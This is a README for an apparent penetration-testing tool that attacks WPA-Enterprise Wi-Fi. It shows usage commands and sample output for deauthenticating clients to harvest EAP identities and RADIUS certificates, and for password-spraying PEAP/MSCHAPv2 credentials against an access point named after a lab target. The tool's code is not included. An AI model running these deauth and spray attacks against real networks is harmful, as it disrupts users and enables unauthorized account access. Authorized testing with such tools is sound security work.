# EAPHunter

Two modes for WPA-Enterprise targets: harvest EAP outer identities and RADIUS
certificates via deauth, or spray credentials directly against the AP.

## Requirements

```
pip install scapy cryptography
```

`wpa_supplicant` required for spray mode. `iw` and `ip` required for both.

## userenum

Puts the interface into monitor mode and continuously tracks associated clients.
Deauth a client to force an EAP re-authentication and capture the outer identity
and RADIUS server certificate from the handshake.

```
sudo python3 eaphunter.py userenum -e <SSID> -i <interface> [-c <secs>] [-o <dir>]
```

At the client table, enter a number to target a client, `auto` to cycle all
undeauthed clients automatically (60s apart, ETA shown), or `q` to quit.

**Limitations:** ineffective if PMKID caching is enabled on the AP (clients skip
the full EAP exchange on reconnect) or if clients use anonymous outer identities.

```
  ==============================================================
  EAPHunter  |  HTB-Corp  |  5c:64:f1:c0:10:a1  |  ch 6  |  14:32:09
  ==============================================================
  #      MAC ADDRESS             PWR    PKTS  VENDOR                     STATUS
  ─────  ────────────────────  ─────  ──────  ─────────────────────────  ──────────
  [1]    d4:61:9d:34:a1:02       -48      91  Apple
  [2]    6c:40:08:bb:23:f7       -61     203  Apple
  [3]    00:1b:77:c2:09:ae       -73      44  Intel

  [?] Select [1-3], 'auto', or 'q': 2

  [!] Sending deauth frames  ->  6c:40:08:bb:23:f7
  [+] EAP Identity  : jsmith@htb-corp.local
  [+] Pcap saved: eap_handshake_6c4008bb23f7.pcap  (847 packets)

  Subject    : CN=radius.htb-corp.local,O=HTB Corp,C=US
  Not After  : 2025-01-15 09:00:00
```

Output: `eap_identities.txt`, `eap_server_cert.der/.pem`, `eap_handshake_<mac>.pcap`

---

## spray

Authenticates against the AP using PEAP/MSCHAPv2 to validate credentials.
Accepts any combination of single values and wordlists. Spray ordering is
password-outer, users-inner — one password tried against all users before
moving to the next, reducing per-account lockout risk.

```
sudo python3 eaphunter.py spray -e <SSID> -i <interface> \
    [-u <user>]  [-U <userfile>] \
    [-p <pass>]  [-P <passfile>] \
    [-d <delay_secs>] [-o <dir>]
```

```
  --------------------------------------------------------------
  Password Spray  —  HTB-Corp  (90 attempts)
  --------------------------------------------------------------
  [001/090]  jsmith                        Winter2024!   ->  failed
  [002/090]  jdoe                          Winter2024!   ->  failed
  [003/090]  HTB\administrator             Winter2024!   ->  VALID  <---
  [+] Valid credential: HTB\administrator:Winter2024!
```

Output: `spray_hits.txt`
